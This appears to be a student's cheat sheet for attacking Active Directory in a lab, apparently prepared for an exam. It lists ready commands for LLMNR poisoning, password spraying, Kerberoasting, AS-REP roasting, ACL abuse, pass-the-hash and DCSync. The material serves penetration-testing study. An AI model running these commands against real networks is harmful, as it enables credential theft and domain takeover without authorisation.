# 🧠 ACTIVE DIRECTORY ATTACK CHEAT SHEET

---

# 🔴 STAGE 0 — Setup

## Fix DNS (VERY IMPORTANT)

```bash
sudo nano /etc/hosts
192.168.56.108 dc01.canozkan.local canozkan.local
```

```bash
sudo nano /etc/resolv.conf
nameserver 192.168.56.108
```

---

# 🔴 STAGE 1 — Initial Access (Credential Hunting)

---

## 🟡 1. LLMNR / NBT-NS Poisoning

```bash
sudo responder -I <interface> -v
```

Crack:

```bash
john --format=netntlmv2 --wordlist=wordlist.txt hash.txt
```

👉 Goal: Capture credentials from network

---

## 🟡 2. Password in Description

### Enumerate Users

```bash
ldapsearch -x -H ldap://<DC-IP> \
-D "user@domain" -w 'password' \
-b "dc=domain,dc=local" "(objectClass=user)" description
```

👉 Look for:

* passwords
* hints
* default password notes

---

## 🟡 3. Password Spraying

### Prepare users

```bash
ldapsearch -x -H ldap://<DC-IP> \
-D "user@domain" -w 'password' \
-b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName \
| grep sAMAccountName | awk '{print $2}' > users.txt
```

---

### Spray

```bash
nxc smb <DC-IP> -u users.txt -p 'password' -d domain
```

---

### Common passwords

```text
Spring2024!
Winter2024!
Password123
ncc1701
```

---

### Output Interpretation

| Result                      | Meaning              |
| --------------------------- | -------------------- |
| SUCCESS                     | Valid creds          |
| STATUS_LOGON_FAILURE        | Wrong password       |
| STATUS_PASSWORD_MUST_CHANGE | Valid but restricted |

---

# 🟡 STAGE 1 GOAL

👉 Get **1+ valid domain user**

---

# 🔵 STAGE 2 — Enumeration (MOST IMPORTANT)

---

## 🧠 Mindset

> “What can this user CONTROL?”

---

## 🔍 1. Validate Access

```bash
nxc smb <DC-IP> -u user -p pass
```

---

## 🔍 2. Enumerate Shares

```bash
nxc smb <DC-IP> -u user -p pass --shares
```

---

## 🔍 3. Enumerate Users

```bash
nxc smb <DC-IP> -u user -p pass --users
nxc ldap <DC-IP> -u user -p pass --users
```

---

## 🔍 4. Enumerate Groups

```bash
nxc ldap <DC-IP> -u user -p pass --groups
```

---

## 🔍 5. LDAP Dump

```bash
ldapdomaindump -u 'domain\\user' -p 'pass' <DC-IP>
```

---

## 🔍 6. BloodHound Collection

```bash
bloodhound-python -u user -p pass -d domain -dc <DC-IP> -c all
```

---

# 🧠 BloodHound Analysis

## Key Queries

* Shortest Paths to Domain Admins
* Shortest Paths from Owned Principals

---

## Important Edges

| Edge         | Meaning            |
| ------------ | ------------------ |
| GenericAll   | Full control       |
| GenericWrite | Modify object      |
| WriteDACL    | Change permissions |
| MemberOf     | Group membership   |

---

## Goal

👉 Build attack chain:

```text
User → Group → ACL → Admin
```

---

# 🔥 STAGE 3 — Exploitation

---

## 🟠 1. Kerberoasting

### Find SPNs

```bash
nxc ldap <DC-IP> -u user -p pass --kerberoast
```

---

### Crack

```bash
hashcat -m 13100 hashes.txt wordlist.txt
```

👉 Goal: Get service account passwords

---

## 🟠 2. AS-REP Roasting

```bash
impacket-GetNPUsers canozkan.local/ -dc-ip 192.168.56.108 -usersfile users.txt
```

---

### Crack

```bash
hashcat -m 18200 hashes.txt wordlist.txt
sudo john --format=krb5asrep asrep_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 🟠 3. Password Spraying (Reuse)

```bash
nxc smb <DC-IP> -u users.txt -p 'ncc1701'
```

👉 Look for multiple valid users

---

# 🔴 STAGE 4 — ACL Abuse (VERY IMPORTANT)

---

## Identify in BloodHound

Look for:

* GenericAll
* GenericWrite
* WriteDACL
* WriteOwner

---

## Common Abuse

### GenericAll → Reset password

```powershell
Set-ADAccountPassword -Identity target -Reset -NewPassword (ConvertTo-SecureString "Pass123!" -AsPlainText -Force)
```

---

### Add user to group

```powershell
Add-ADGroupMember -Identity "Admins" -Members user
```

---

# 🔴 STAGE 5 — Lateral Movement

---

## Pass-the-Hash

```bash
nxc smb <target> -u user -H <hash>
```

---

## Pass-the-Ticket

```bash
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain/user@target
```

---

# 🔴 STAGE 6 — Domain Dominance

---

## 🟣 DCSync

```bash
secretsdump.py domain/user@DC
```

---

## 🟣 Golden Ticket

Use:

* krbtgt hash

---

## 🟣 Silver Ticket

Use:

* service account hash

---

# ⚠️ WHAT TO ALWAYS LOOK FOR

---

## 🔑 Credentials

* Description fields
* Default passwords
* Shared passwords

---

## 👥 Groups

* IT Admins
* Domain Admins
* Nested groups

---

## 🔐 Misconfigurations

* Weak passwords
* ACL abuse
* SPNs
* Pre-auth disabled

---

# 🧠 ATTACK FLOW SUMMARY

```text
No Access
   ↓
Password Leak / Spray
   ↓
Valid User
   ↓
Enumeration (BloodHound)
   ↓
Kerberoast / ACL Abuse
   ↓
Privileged User
   ↓
DCSync
   ↓
Domain Admin
```

---

# 🚀 FINAL EXAM STRATEGY

---

## If stuck:

1. Enumerate again
2. Re-check BloodHound
3. Try:

   * Kerberoast
   * AS-REP
   * Password spray
   * ACL abuse

---

## Golden Rule

👉 AD is not about exploits
👉 It is about relationships
